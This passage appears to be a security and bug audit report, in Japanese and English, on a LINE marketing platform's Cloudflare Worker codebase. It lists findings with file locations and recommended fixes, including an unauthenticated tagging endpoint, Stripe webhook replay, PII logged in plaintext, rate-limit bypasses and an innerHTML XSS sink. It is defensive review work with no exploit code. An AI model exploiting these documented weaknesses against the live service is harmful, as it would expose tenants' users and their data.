- **score_threshold condition fails open when currentScore is absent from the payload** — `apps/worker/src/services/event-bus.ts:196` (`bug-crm-automation`, CONFIRMED)
  - matchConditions() only enforces score_threshold when both payload.eventData exists and eventData.currentScore is !== undefined (event-bus.ts:196-198). currentScore is injected in fireEvent only when payload.friendId is set (event-bus.ts:64-72). For any event fired without a friendId (e.g. incoming_webhook.* at webhooks.ts:373), an automation carrying a score_threshold condition passes the threshold check unconditionally rather than being skipped.
  - 推奨: Treat a missing currentScore as a non-match (return false) when score_threshold is present, so the gate fails closed rather than open.
- **Meta fbc のタイムスタンプがクリック時刻でなくCV送信時刻(Date.now())で誤帰属** — `apps/worker/src/services/ad-conversion.ts:96` (`bug-attribution`, CONFIRMED)
  - Meta CAPI の fbc を `fb.1.${Date.now()}.${ref.fbclid}` で組み立てている(96行)。fbc の第3セグメントは『クリック(cookie 生成)時刻』であるべきだが、ここでは送信(=CV発生)時刻を使う。クリックからCVまで日単位で開くと fbc の時刻が実クリックとずれ、Meta 側のクリック照合が劣化/不一致になり誤帰属や取りこぼしを招く。ref_tracking.created_at(クリック時刻)を秒エポックに変換して使うべき。event_time(93行)は現在時刻で正しいが fbc は別。
  - 推奨: fbc のタイムスタンプに ref.created_at を秒エポック化した値を使う(例: `fb.1.${Math.floor(new Date(ref.created_at).getTime()/1000)}.${ref.fbclid}`)。ブラウザ側 _fbc cookie がある場合はそれを優先。
- **広告CVの event_id が呼び出し毎ランダム(Metaは欠落)で媒体側デデュープが効かず二重計上** — `apps/worker/src/services/ad-conversion.ts:138` (`bug-attribution`, CONFIRMED)
  - X は `event_id: crypto.randomUUID()`(138行)、TikTok も `event_id: crypto.randomUUID()`(206行)を毎回新規生成し、Meta CAPI は event_id 自体を送っていない(91-100行の eventData に無い)。event_id は媒体側の重複排除キーであり、同一論理CVで sendAdConversions が複数回走った場合(partial failure 後のリトライ、テスト再実行、将来イベント経路が二重発火)に、X/TikTok は別 event_id のため別CV扱い、Meta は常に重複排除不能となり二重計上される。
  - 推奨: (friendId, eventName, 該当CVの安定キー) から決定的な event_id を生成し、Meta の eventData にも event_id を含める。可能なら conversion_events.id を event_id にひも付けて冪等化する。
- **entry_route 作成時の ref_tracking バックフィルが namespace 横断でアフィリ/tracked クリックを横取り** — `packages/db/src/entry-routes.ts:113` (`bug-attribution`, CONFIRMED)
  - createEntryRoute は ref_code 一致かつ entry_route_id NULL の ref_tracking 行を新 route に UPDATE でバックフィルする(113-120行)。/r/:ref の ref_code 名前空間は entry_route / tracked_link / affiliate_link で共有される(liff.ts applyRefAttribution:174-189 が route→tracked→affiliate の順で解決)。createEntryRoute は refCode の他 namespace との衝突を検証しない(routes/entry-routes.ts:70 は refCode/name 必須のみ)。よって既存アフィリリンクと同じ ref_code の entry_route を作ると、そのアフィリの(entry_route_id が NULL の)過去 ref_tracking 行が entry-route ファネルに取り込まれ、さらに getEntryRouteByRefCode が先に解決するため以後の /r/:ref がアフィリ経路を乗っ取る。
  - 推奨: entry_route 作成時に refCode が既存 affiliate_links.ref_code / tracked_links.short_code と衝突しないことを検証して弾く。バックフィルも『他 namespace の ref_code と衝突しない』ことを確認してから実行する。
- **自己クリック除外が friend_id 等価のみで、同一人物の別アカウント友だち経由の自己成果を除外できない** — `packages/db/src/affiliate-attribution.ts:49` (`bug-attribution`, CONFIRMED)
  - resolveAffiliateAttribution の自己クリック除外は `(a.friend_id IS NULL OR a.friend_id != rt.friend_id)`(49行)で、変換した friend が『そのアフィリに紐づく friend_id そのもの』の時だけ除外する。identity_key(url_token 由来、同一人物が別 line_account では別 friend.id)ベースではないため、アフィリ本人が別アカウントで友だち(別 friend.id)になって自分の ref から成果を発生させると a.friend_id != rt.friend_id となり除外されない。承認キューの duplicateFlag(affiliate-report.ts:730-734)は identity_key が2件以上で初めて立つ補償制御のため、単発の自己成果は検知もされない。
  - 推奨: 自己クリック除外を identity_key(url_token 由来)ベースに拡張し、アフィリ本人の identity_key と変換 friend の identity_key が一致する touch を除外する。少なくとも承認キューで単発でも自己一致を警告表示する。
- **messages_log.delivery_type CHECK drift: migration 009 creates a 2-value CHECK, migration 026 is a no-op with a false comment, so delivery_type='test' is rejected on migration-built DBs** — `/home/shinohara/.line-harness/packages/db/migrations/026_delivery_type_test.sql:1` (`bug-db-migrations`, PLAUSIBLE)
  - migrations/009_delivery_type.sql:2 adds the column with a two-value CHECK: `ALTER TABLE messages_log ADD COLUMN delivery_type TEXT CHECK (delivery_type IN ('push','reply'))`. migrations/026_delivery_type_test.sql is a pure no-op (`SELECT 1`) whose comment claims 'D1 doesn't enforce CHECK on INSERT when the column already exists' and that new values are only documented in schema.sql. That claim is false — I verified with node:sqlite that a CHECK added via ALTER TABLE ADD COLUMN IS enforced: inserting delivery_type='test' returns 'CHECK constraint failed: delivery_type IN (\'push\', \'reply\')'. schema.sql:181 and bootstrap.sql:549 carry the correct 3-value CHECK ('push','reply','test'), so installer/bootstrap DBs are fine and the fallback path is fine (schema.sql defines the column first, so migration 009's ALTER is skipped as duplicate-column). The bug bites any DB where migration 009 actually created the column (sequential migrations onto a base that predated delivery_type — i.e. legacy/inherited production DBs). The app writes delivery_type='test' for broadcast test-sends (documented in migrations/028_messages_log_source.sql).
  - 推奨: Replace the 026 no-op with a real table rebuild that expands the CHECK to include 'test' (follow the recreate pattern in migrations/027_dedup_delivery.sql / 029_account_management_v2.sql), or drop the CHECK from delivery_type entirely and validate in application code. Correct the misleading comment; do not rely on 'CHECK is not enforced'.
- **created_at DEFAULT expressions are inconsistent (UTC datetime('now') vs naive-JST strftime), none matching the app's +09:00 jstNow() format** — `/home/shinohara/.line-harness/packages/db/schema.sql:718` (`bug-db-migrations`, CONFIRMED)
  - The project standardizes timestamps to JST (utils.ts:5-22, jstNow() -> 'YYYY-MM-DDTHH:mm:ss.sss+09:00'), and most tables default created_at to naive JST via strftime('%Y-%m-%dT%H:%M:%f','now','+9 hours'). But several tables default to UTC via datetime('now'): schema.sql message_templates (718-719) and pool_accounts (728); and in the runtime schema (bootstrap.sql) entry_routes (286), forms (401), form_submissions (388), form_opens (380), tracked_links (801), link_clicks (509), ref_tracking (614), and broadcasts (219, after the 029 rebuild). Three formats therefore coexist: naive-JST 'YYYY-MM-DDTHH:MM:SS.SSS' (parsed by new Date()/julianday as UTC -> 9h ahead of the true instant), UTC 'YYYY-MM-DD HH:MM:SS' (true instant), and offset-JST '...+09:00' (true instant). migrations/031_batch_lock_at.sql documents this exact 9h-skew hazard. It is currently latent only because every insert path I checked (friends.ts:177, forms.ts:createForm, entry-routes.ts:83/243, tracked-links.ts:213, message-templates.ts:43) supplies created_at via jstNow() explicitly, so the DEFAULT rarely fires.
  - 推奨: Pick one canonical stored format and use it for every created_at DEFAULT (recommended: match the app — offset-suffixed JST, or naive-JST everywhere and never parse with a bare new Date()). Rewrite the datetime('now') defaults in schema.sql (message_templates, pool_accounts) and in the migration-created tables to the JST strftime form, and regenerate bootstrap.sql.
- **Denormalized counter columns are incremented in separate non-transactional statements and can drift from their detail rows** — `/home/shinohara/.line-harness/packages/db/src/tracked-links.ts:223` (`bug-db-migrations`, CONFIRMED)
  - recordLinkClick (tracked-links.ts:215-228) inserts a link_clicks row and then, as a SEPARATE db.prepare().run() call, does `UPDATE tracked_links SET click_count = click_count + 1`. The two writes are not wrapped in a D1 batch/transaction, so a failure or Worker termination between them (or concurrent clicks racing the read-modify-write increment) leaves tracked_links.click_count out of sync with COUNT(link_clicks). The same non-atomic denormalized-counter pattern appears in forms.ts:297 (forms.submit_count vs form_submissions rows) and affiliate-links.ts:166 (affiliate_links.click_count). affiliate-report.ts:148 reports SUM(click_count) directly from the denormalized column, so drift surfaces in analytics rather than being recomputed from source rows.
  - 推奨: Combine the detail-row insert and the counter increment into a single db.batch([...]) so they commit atomically, or drop the denormalized counters and derive counts with COUNT()/a view at read time (indexes already exist on link_clicks.tracked_link_id and form_submissions.form_id). At minimum, provide a periodic reconciliation query.
- **サロン予約 LIFF 作成に in-flight 予約ガードが無く、同時ダブルタップで冪等キーが 409 を返し得る** — `apps/worker/src/routes/booking.ts:307` (`bug-booking-events`, CONFIRMED)
  - POST /api/liff/booking/requests は event 側(reserveEventIdempotency の reserve/finalize)と異なり、先頭で findIdempotencyResponse(307行)を引くだけで in-flight 予約行を作らない。saveIdempotencyResponse は成功(201, 465行)と衝突(409, 432行)の両方を `ON CONFLICT(key) DO NOTHING` で書く。
  - 推奨: event-booking-idempotency の reserve/finalize(INSERT OR IGNORE でプレースホルダ→完了時 UPDATE、in_progress は 429)と同じパターンをサロン側にも導入し、成功レスポンスのみを安定してリプレイできるようにする。
- **サロンリマインダ cron に CAS クレームが無く、実行重複時に同一リマインダを二重送信し得る** — `apps/worker/src/services/booking-reminders.ts:64` (`bug-booking-events`, CONFIRMED)
  - processDueReminders は due 行を取得後そのまま sender を呼び、送信後に status='sent' へ更新する。event 版(event-booking-reminders.ts:164-172)が明示的に導入した『retry_count を epoch にした CAS クレーム(UPDATE ... WHERE id=? AND retry_count=?)』が無い。
  - 推奨: event 版と同じく送信前に条件付き UPDATE でクレーム(changes=0 ならスキップ)を行い、当該行を占有してから送信する。
- **空き計算の busy 区間が JST HH:MM に丸められ、JST 日跨ぎ予約が空き判定から抜ける** — `apps/worker/src/services/availability.ts:199` (`bug-booking-events`, CONFIRMED)
  - getAvailability(199-205行)と LIFF/admin 作成の再検証(booking.ts:378-381, 820-823)は既存予約を jstHHMM で 'HH:MM' に切り出して busy 区間にする。block_ends_at が JST 深夜0時をまたぐ予約では end='00:30' < start='23:30' の反転区間になり、subtract() は overlap 無しと誤判定してその枠を空きとして表示/検証してしまう。
  - 推奨: busy 区間は HH:MM 丸めではなく UTC タイムスタンプ(分)ベースで subtract するか、日跨ぎ分を翌日区間へ分割する。少なくとも end<=start の反転区間を検出して当日末尾まで(あるいは丸ごと busy)として扱う。
- **サロン予約の cancel/expire が 'failed' リマインダをキャンセルせず event 版と非対称** — `apps/worker/src/routes/booking.ts:1253` (`bug-booking-events`, CONFIRMED)
  - PATCH /api/booking/admin/requests/:id の cancel/expire 分岐は booking_reminders を `status='pending'` のみ cancelled 化する(1253行)。一方 expirer(booking-expirer.ts:64)と event 版は `IN ('pending','failed')` を対象にする。retry で 'failed' になったリマインダは残る。
  - 推奨: cancel/expire 時のリマインダ無効化を `status IN ('pending','failed')` に統一し、expirer / event 版と対称にする。
- **GET /api/line-accounts/:id が admin にも平文シークレットを返し、一覧の secret 省略が実質無効化** — `apps/worker/src/routes/line-accounts.ts:122` (`pii-at-rest`, CONFIRMED)
  - 一覧 (serializeLineAccount, line-accounts.ts:18-41) は意図的に channelAccessToken/channelSecret/loginChannelSecret を省略しているが、詳細 GET /:id は `staff?.role === 'staff' ? serializeLineAccount : serializeLineAccountFull` (122-124) で owner だけでなく admin にも serializeLineAccountFull(43-50) で平文シークレットを返す。書き込み側は「本番影響が大きい」として PUT/credentials を owner 専用に制限している(349-355)のに、読み取り側は admin にフル開示で非対称。さらに三項の既定が Full 側なので、将来この経路が authMiddleware 外や staff 未設定の文脈に置かれると fail-open になる。結果として『一覧で secret を省略する』防御は :id を1回叩けば回避でき、実効性がない。
  - 推奨: 詳細シークレットの開示も owner 限定にする(admin は serializeLineAccount)。三項の既定を安全側(redacted)に反転し、`staff?.role === 'owner'` を明示条件にする。可能なら secret は返さずマスク(末尾4桁のみ)+ 別途 owner 限定の verify エンドポイントにする。
- **identity_key の空文字コラプス + JS/SQL 実装乖離による誤マージ** — `apps/worker/src/lib/identity-key.ts:10` (`pii-at-rest`, PLAUSIBLE)
  - SQL 版 (identity-key.ts:10-16 / url-token.ts:11-17) は SUBSTR(picture_url, 42, 80) 等の固定窓で、picture_url が CDN プレフィックスにマッチするが十分に長くない場合 SQLite の SUBSTR は空文字 '' を返す。COALESCE は NULL しかスキップしないため URL_TOKEN_SQL='' がそのまま identity_key='' として採用され、'uid:'/'solo:' フォールバックに落ちない。一方 JS 版 computeIdentityKey (29-41) は `if (token)` で空文字を弾き uid/solo に落とすため、同一 friend でも events(JS 経路) と duplicates-stats(SQL 経路) で identity_key が食い違う。さらに duplicate-detect.ts:89 は `LENGTH(picture_url) > 50` ガードを持つのに、duplicates-stats.ts の TOTALS_SQL/PER_ACCOUNT_SQL/PAIRWISE_RAW_SQL(59,77,110 付近) には長さガードが無く、空/極短トークンがそのまま集計に入る。
  - 推奨: URL_TOKEN_SQL を `NULLIF(SUBSTR(...), '')` でラップし、抽出長不足を NULL に落として COALESCE を正しくフォールバックさせる。duplicates-stats 側にも duplicate-detect と同じ `picture_url IS NOT NULL AND LENGTH(picture_url) > 50` ガードを追加。JS と SQL の空判定を一致させ、両実装に対する共通テスト(同一 friend で同一 key を返す)を追加する。
- **duplicate-detect がクロスアカウントで friend_tags を書き込み在籍関係を可視化(現状 dormant)** — `apps/worker/src/services/duplicate-detect.ts:130` (`pii-at-rest`, PLAUSIBLE)
  - processDuplicateDetection (duplicate-detect.ts:60-158) は url_token 一致で他アカウントの friend を突き止め、両側に『重複:』タグを INSERT する(125-141)。tags はアカウントスコープを持たない共有テーブルなので、付与された重複タグ自体がクロスアカウント在籍(同一人物が A と B に居る)を UI 上で恒久的に表出させる。現状 index.ts:953 のコメントどおり cron から外され、grep でも呼び出し元が無く dormant だが、サービスは残存し引数さえあれば呼べる。
  - 推奨: 復活させる場合は finding 3 と同じくテナント境界ポリシーを満たすこと(同一運用主体内に限定)を前提化する。当面は誤起動防止のため関数に feature-flag/ガードを入れるか、方針が確定するまで削除も検討。既存の『重複:』タグ行の扱い(残置の是非)を ADR 化する。
- **LINE line_user_id(PII)が webhook の follow/自動登録処理で複数箇所 console に出力される** — `apps/worker/src/routes/webhook.ts:194` (`pii-in-logs`, CONFIRMED)
  - webhook 処理系で line_user_id(userId)が複数箇所で平文ログ出力される: line 52 `Failed to get profile for unknown user' + userId`、line 61 `auto-registered existing friend userId=${userId}`、line 194 `[follow] userId=${userId} lineAccountId=`、line 201 `Failed to get profile for' + userId`、line 289 `Immediate delivery: sent step ... to ${userId}`。friends.line_user_id はスキーマ上 PII 指定の安定識別子で、これがログに残ると同一ログストリーム上の display_name と突き合わせて個人特定が可能になる。全テナント相乗り D1 のため影響範囲が全テナントに及ぶ。
  - 推奨: userId を直接ログに出力しない。相関には friend.id(内部 UUID)を用いる。どうしても LINE ID が必要な調査時のみ、マスキング(先頭数文字 + ハッシュ)や本番 no-op の debug ロガーを使う。line 52/61/194/201/289 を一括で修正する。
- **フォーム返信処理で friend.line_user_id(PII)が console.log される** — `apps/worker/src/routes/forms.ts:522` (`pii-in-logs`, CONFIRMED)
  - 公開フォーム submit の side-effect 内で `console.log('Form reply: sending to', friend.line_user_id)`(line 522)および line 519/521 のデバッグログが実行され、LINE ユーザ ID がログに出力される。フォーム送信は未認証のエンドユーザ操作で発火するため、送信のたびに PII がログに書き込まれる。デバッグ用途のログが本番に残っている典型例。
  - 推奨: line 519/521/522 のデバッグ console.log を削除する。相関が必要なら friendId(内部 ID)のみに限定する。
- **友だち個別送信 API のエラー応答に生の内部エラーメッセージ(LINE API 応答本文)を反映** — `apps/worker/src/routes/friends.ts:611` (`pii-in-logs`, CONFIRMED)
  - `POST /api/friends/:id/messages` の catch で `errMsg = err.message` をそのまま `c.json({ success:false, error: errMsg }, 500)` として返却している(line 609-611)。pushMessage 失敗時、LineClient は `LINE API error: <status> <statusText> — <LINE応答本文>`(packages/line-sdk/src/client.ts:49-51)を throw するため、LINE 側の内部エラー本文がそのまま API 呼び出し元へ露出する。console.error(line 610)にも同文字列が残る。
  - 推奨: 外部応答は汎用メッセージ(例: `internal_error`)に固定し、詳細は内部ログのみに留める。少なくとも LINE 応答本文はレスポンスに含めない。conversations.ts:177/278、broadcasts.ts:729、chats.ts など String(err)/err.message をそのまま返す箇所も同様に見直す。
- **X(Twitter)ユーザ名を friend に紐づけて console.log(識別子リンケージのログ露出)** — `apps/worker/src/routes/liff.ts:952` (`pii-in-logs`, CONFIRMED)
  - X Harness 連携処理で `console.log(`X Harness: linked @${xhResult.xUsername} to friend ${friend.id}`)` が line 952/1356/1424 等で実行され、外部 SNS ハンドル(@username)を内部 friend.id に結び付けた形でログ出力される。SNS ハンドルは個人を特定しうる情報で、friend.id とのリンケージがログに残ると名寄せの材料になる。連携有効時のみ発火するため頻度は限定的。
  - 推奨: SNS ハンドルはログに出さず、成功可否と friend.id のみを記録する。調査で必要ならマスキングまたは本番 no-op の debug ロガーへ。line 952/1356/1424/1775 を一括で見直す。
- **Meta CAPI / TikTok Events API に生の IP アドレス・User-Agent を同意ゲート無しで送信** — `apps/worker/src/services/ad-conversion.ts:97` (`pii-in-transit`, CONFIRMED)
  - sendMetaConversion は user_data.client_ip_address=ref.ip_address、client_user_agent=ref.user_agent を graph.facebook.com へ送信(97-98行)、sendTikTokConversion も context.ip/user_agent を business-api.tiktok.com へ送信(209-211行)。IP と UA は GDPR/個人情報保護法上の個人関連情報・個人データになり得るが、コード上に同意(consent)やオプトアウトの判定が一切無く、ref_tracking に保存された IP/UA が CV 発火のたびに無条件で Meta / TikTok へ送られる。なお本ペイロードは fbc/ttclid + IP + UA のみで email/phone は含まないため、Meta CAPI の SHA-256 ハッシュ必須項目(em/ph/external_id)の未ハッシュ送信には該当しない(IP/UA/fbc は仕様上ハッシュ化しない項目)。したがって『未ハッシュ送信』ではなく『同意ゲート欠如の生IP/UA第三者送信』が論点。
  - 推奨: 広告CV送信の前段に同意フラグ(friends/ref_tracking への consent 記録)を導入し、未同意なら IP/UA を送らない(または送信自体を抑止)。少なくとも client_ip_address/client_user_agent の送出を consent 条件でガードし、送信ポリシーをプライバシーポリシーと整合させる。
- **line_account 削除時に所属 friends の PII が残存し、消去/整理経路が無い** — `packages/db/src/line-accounts.ts:200` (`pii-retention-deletion`, CONFIRMED)
  - deleteLineAccount は `DELETE FROM line_accounts WHERE id = ?` の素の削除（apps/worker のルートから呼ばれる）。friends.line_account_id は migration 008_multi_account.sql:5 で `REFERENCES line_accounts(id)` だが ON DELETE 句が無く既定は NO ACTION/RESTRICT。messages_log.line_account_id（migration 032）は FK 無しの素の列。FK が強制される環境ではアカウント削除自体が RESTRICT で失敗し（アカウントも友だちも撤去不能）、強制されない場合は friends 行が dangling な line_account_id を抱えたまま PII が残る。いずれにせよ、退会したアカウントに属する friends の PII を消去/匿名化する経路が無い。
  - 推奨: friends.line_account_id の ON DELETE 挙動を明示（CASCADE か SET NULL か）し、アカウント退会時に所属 friends を削除/匿名化する documented なオフボーディング手順・処理を追加する。
- **friend metadata はマージ専用でキー単位の消去ができず、PII を部分削除できない** — `apps/worker/src/routes/friends.ts:489` (`pii-retention-deletion`, CONFIRMED)
  - PUT /api/friends/:id/metadata は `const merged = { ...existing, ...body }`（friends.ts:487-489）で既存 metadata に body を浅くマージするのみ。metadata にはフォーム回答・email/phone 等の PII が入りうるが、あるキーを空文字/ null で上書きはできてもキー自体を削除する手段が API に無い。データ最小化・部分的消去（特定項目だけの削除要求）に応えられない。
  - 推奨: metadata の unset（キー削除）に対応する（例: 値が null のキーを削除、あるいは専用の delete-keys パラメータを追加）。データ最小化のため保存項目を最小限に絞る指針も設ける。
- **/t/:linkId?f= が無認証でタグ付与・シナリオ登録(push誘発)を任意友だちに実行** — `apps/worker/src/routes/tracked-links.ts:344` (`sec-public-webhooks`, CONFIRMED)
  - tracked-links.ts:282-363、公開リダイレクト(auth.ts /t/)がクライアント指定の f(friendId)/lu(lineUserId)で友だちを解決し、link.tag_id 付与と link.scenario_id 登録(tracked-links.ts:344-357)を実行する。シナリオ登録はステップ配信=push を誘発する。short_code は7文字で列挙容易、friendId は上記 /api/liff/profile で取得可能。
  - 推奨: friend への副作用(tag/シナリオ)は本人検証済みの文脈(id_token 経由の /api/liff/link など)に限定し、/t の f/lu からの直接副作用は計測のみに絞るか署名付き識別子に限定する。
- **Stripe署名検証にタイムスタンプ許容差なし・非定数時間比較** — `apps/worker/src/routes/stripe.ts:82` (`sec-public-webhooks`, CONFIRMED)
  - verifyStripeSignature(stripe.ts:57-83)は t= を parse するが(65)現在時刻との許容差検証をしないため署名の有効期限が無制限(リプレイ窓が開く)。また computedSig === expectedSig(82)は非定数時間比較。冪等性チェック(stripe.ts:106)により同一 id の再処理は防げるため実害は限定的だが、未処理の捕捉済みイベントは後から再送で処理され得る。
  - 推奨: Stripe 公式同様に |now - t| がトレランス(例5分)超なら拒否。比較は定数時間(webhooks.ts:44 safeEqualHex 相当)に統一する。
- **公開 /t/:linkId が attacker 指定 friendId/lineUserId でクロスアカウントにタグ付与・シナリオ登録・クリック帰属を偽装** — `apps/worker/src/routes/tracked-links.ts:341` (`sec-tenant-isolation`, CONFIRMED)
  - /t/:linkId は無認証公開（auth.ts:158 `/t/`）。クエリ `f`（friendId, 285 行）/`lu`（lineUserId, 284 行）をそのまま使い、recordLinkClick（341 行）でクリックを記録、link.tag_id/scenario_id を addTagToFriend / enrollFriendInScenario で友だちに適用（347-352 行）する。友だちがそのリンクの所属アカウント（tracked_links.line_account_id、resolveLinkAccount:62）と一致するかの検証は無く、getFriendByLineUserId（329 行）もアカウント非スコープ。
  - 推奨: recordLinkClick 前に、解決した friend の line_account_id が resolveLinkAccount(link) のアカウントと一致することを検証し、不一致なら副作用（tag/scenario/click）をスキップする。`f`/`lu` は信頼境界外入力として扱い、可能なら LIFF 経由の識別に限定する。
- **Worker 配信の SPA/LIFF アセット・/api/liff 呼び出しが未認証 100req/min の IP バケットを消費し、共有 IP の正規ユーザーを 429 にする** — `apps/worker/src/middleware/rate-limit.ts:158` (`x-config-dos`, PLAUSIBLE)
  - wrangler.toml の `run_worker_first = true`(20行目)により、静的アセットを含む全リクエストがまず Worker を通り app.use('*', rateLimitMiddleware)(index.ts:149)を実行する。rate-limit の skip は `/docs`・`/openapi.json`・`/r/` だけ(rate-limit.ts:127)で、LIFF SPA アセット(notFoundHandler が c.env.ASSETS から配信)や `/api/liff/*` は対象外。これらは Authorization ヘッダも admin cookie も持たないため token=null となり、158-162 行の分岐で IP キー・UNAUTHENTICATED_MAX=100/min に落ちる。LIFF は Worker がアセット配信を担い(deploy-cloudflare-worker.yml の『Build Worker and LIFF assets』)、1 ページ表示で多数の JS/CSS チャンク + /api/liff 呼び出しが同一 IP に集中する。日本のモバイルキャリア/MVNO は CGNAT で多数ユーザーが 1 グローバル IP を共有するため、複数ユーザーの合算で 60 秒あたり 100 リクエストを容易に超える。
  - 推奨: 静的アセットパス(/assets/ 等)と `/api/liff/*` を rate-limit の skip 対象に追加するか、アセットは Worker を経由させず(bot OGP 判定が不要なパスは run_worker_first の対象外にする / Pages 直配信)、LIFF エンドポイントの未認証 IP 上限を用途に見合う値へ引き上げる。IP キーは cf-connecting-ip 前提でも CGNAT を考慮する。
- **/r/:ref がレート制限 skip かつ 1 ヒットで複数 D1 クエリを発行し、共有 D1 への未認証 DoS 増幅になる** — `apps/worker/src/middleware/rate-limit.ts:127` (`x-config-dos`, CONFIRMED)
  - rate-limit.ts:127 は `path.startsWith('/r/')` を無条件で skip する。一方 /r/:ref(index.ts:235-303)は 1 リクエストごとに getEntryRouteByRefCode → (miss 時)getAffiliateLinkByRefCode → getTrafficPoolBySlug('main') → getRandomPoolAccount → 場合により getPoolAccounts と、いずれも個別の D1 クエリ(entry-routes.ts:61 / affiliate-links.ts:120 / traffic-pools.ts:54,178,186)を発行する。affiliate ref が一致した場合は incrementAffiliateLinkClick(index.ts:275)で未認証の D1 書き込みまで走る。全テナントが単一 D1 に相乗りする設計のため、レート制限を一切受けないこの経路への大量アクセスは D1 の読み書きスループット/1kサブリクエスト系の上限を消費し、他テナントの API 応答まで巻き込む。
  - 推奨: /r/ を rate-limit の無条件 skip から外し、IP ベースの上限(実効的な共有カウンタ)を適用する。存在しない ref は最初の 1 クエリで早期に打ち切り、pool フォールバック(getTrafficPoolBySlug('main') 以降)を実行しない。incrementAffiliateLinkClick はバッチ/非同期集計に寄せて同期書き込みを減らす。
- **POST /api/images が base64 を全量デコードしてからサイズ検査するためメモリ/CPU スパイクを誘発** — `apps/worker/src/routes/images.ts:37` (`x-config-dos`, CONFIRMED)
  - JSON アップロード経路で 37 行目の `Uint8Array.from(atob(base64), ch => ch.charCodeAt(0))` が base64 全体をデコードしてから、44 行目の `data.byteLength > 10MB` 検査を行う。検査はデコード後にしか効かないため、Workers が受け付ける大きなリクエストボディ(数十MB)をそのまま atob + map で展開し、10MB 超と判定される前に数十MB の中間バッファを確保する。atob と per-char map は O(n) で、巨大入力では 128MB のメモリ上限や CPU 時間上限に達して isolate が kill されうる。サイズ判定は Content-Length または base64 文字列長でデコード前に行うべき。
  - 推奨: デコード前に Content-Length と base64 文字列長(概算 byte = len*3/4)で 10MB 上限を先に弾く。バイナリ経路も arrayBuffer 取得前に Content-Length を検査する。
- **POST /api/rich-menus/:id/image の base64 経路にサイズ上限が一切無く、char単位ループで CPU を消費** — `apps/worker/src/routes/rich-menus.ts:221` (`x-config-dos`, CONFIRMED)
  - rich-menus.ts の base64 経路(212-227)は 221-225 行で `atob` 後にバイナリ文字列を 1 バイトずつ回す for ループで Uint8Array を構築するが、サイズ検査が全く無い。バイナリ経路(230-231)も同様に上限が無い。/api/rich-menu-groups/.../image 側は validateRichMenuImage(image-validator.ts:88)で 1MB 上限を持つのに、この LINE 直プロキシ経路だけ無防備。最終的に LINE 側が過大画像を拒否するとしても、Worker は巨大 base64 を JS の char ループで全展開してからでないと送出しないため、CPU 時間・メモリを先に消費する。
  - 推奨: デコード前に Content-Length / base64 長で上限(LINE の rich menu は 1MB)を弾く。char 単位ループではなく `Uint8Array.from(atob(...), c => c.charCodeAt(0))` などに置換しつつ、それも上限検査後にのみ実行する。
- **wrangler.toml の workers_dev=true が本番 Worker を *.workers.dev で常時公開し、独自ドメインの防御を迂回可能にする** — `apps/worker/wrangler.toml:5` (`x-config-dos`, CONFIRMED)
  - トップレベルで `workers_dev = true`(5行目)が設定され、[env.production](58-77)はこれを上書きしない。結果として本番 Worker(PII を扱う全 REST API)は独自ドメインに加え、予測可能な `<name>.<subdomain>.workers.dev` でも常時到達可能になる。独自ドメイン側に WAF / Firewall Rules / ジオ制限 / Bot 対策を設定しても、workers.dev の直 URL を叩けば全て迂回できる。API は認証で保護されているが、未認証エンドポイント(webhook/form submit/qr/r)や列挙・DoS の入口としてこの二重公開は攻撃面を広げる。
  - 推奨: [env.production] で `workers_dev = false` を明示し、Custom Domain / Route バインドのみで公開する。これによりドメイン層の防御を迂回不能にする。
- **LIFF bootstrap failure message injected via innerHTML without escaping** — `apps/liff/src/main.tsx:22` (`x-web-frontend`, CONFIRMED)
  - When initLiff() throws, main.tsx writes the raw error text into the DOM via innerHTML: document.getElementById('root')!.innerHTML = `...<p>${err instanceof Error ? err.message : String(err)}</p>...` (apps/liff/src/main.tsx:19-24). The error message is not HTML-escaped. Today the reachable messages are static strings and SDK/network errors, so exploitability is low, but any future error path that folds a URL param or server response text into the thrown message would become an XSS sink.
  - 推奨: Escape before insertion or, preferably, build the error UI with textContent: create the elements and assign errEl.textContent = message instead of innerHTML string interpolation.

## ℹ️ INFO / 多層防御・将来リスク

- **Duplicate migration number prefixes rely on filename tiebreak ordering** — `/home/shinohara/.line-harness/packages/db/migrations/009_delivery_type.sql:1` (`bug-db-migrations`, PLAUSIBLE)
  - Six migration numbers are used by two or three files each: 009 (009_delivery_type.sql, 009_token_expiry.sql), 018 (018_broadcast_queue.sql, 018_message_templates.sql), 037 (037_event_booking.sql, 037_scenario_delivery_mode.sql), 038 (038_entry_routes_pool_and_push.sql, 038_scenario_templates_and_stats.sql), 041 (041_account_og_defaults.sql, 041_event_custom_messages.sql, 041_update_history.sql), and 046 (046_affiliate_links.sql, 046_link_tracking_controls.sql). Ordering is decided purely by full-filename alphabetical sort (generate-bootstrap.mjs listMigrationFiles() and create-line-harness database.ts both use readdirSync().sort()). I checked each colliding pair and none has a hard dependency on the other today, so there is no current bug — but the numbering scheme provides no guaranteed order between same-number files, and a future migration that assumes '046 runs before 047' semantics, or a tool that orders by numeric prefix only, could apply them in an unintended order.
  - 推奨: Enforce unique, monotonically increasing migration numbers (renumber the collisions or move to a timestamp-prefixed scheme) and add a CI check that rejects duplicate numeric prefixes, so ordering never depends on the alphabetical tail of the filename.
- **会話一覧/詳細 API の 500 応答に String(err) を直接反映** — `apps/worker/src/routes/conversations.ts:177` (`pii-in-logs`, PLAUSIBLE)
  - `GET /api/conversations`(line 177)と `GET /api/conversations/:friendId`(line 278)の catch が `c.json({ success:false, error: String(err) }, 500)` を返す。D1 クエリ例外時に SQL 断片やスタック由来の内部情報が呼び出し元に露出しうる。同一 err は console.error でもログに出力される。
  - 推奨: 500 応答は固定の汎用文言にし、詳細は内部ログのみに残す。エラー詳細を返す共通ハンドラを用意して個別ルートでの String(err) 反映を排除する。
- **env API_KEY / LEGACY_API_KEY を非定数時間の === で比較(タイミングサイドチャネル)** — `apps/worker/src/middleware/auth.ts:110` (`sec-authn-authz`, PLAUSIBLE)
  - authenticateApiToken のフォールバックで owner マスターキーを `token === c.env.API_KEY`(auth.ts:110)および `token === c.env.LEGACY_API_KEY`(auth.ts:122)と JS の文字列 === で比較している。=== は最初に異なるバイトで短絡するため比較時間が一致プレフィックス長に依存し、理論上バイト単位のタイミング推測が可能。これは owner 権限の環境マスターキー(漏洩時の被害が最大)に対する比較であり、DB 側 getStaffByApiKey もインデックス照合で厳密には非定数時間。
  - 推奨: env キー比較を定数時間比較に置き換える(両者を同一長ハッシュ(例 SHA-256)にしてから crypto.subtle.timingSafeEqual 相当、または長さ非依存の XOR 累積比較)。理想的には env API_KEY もハッシュ保存して DB キーと同じ経路で照合し、平文一致比較を排除する。
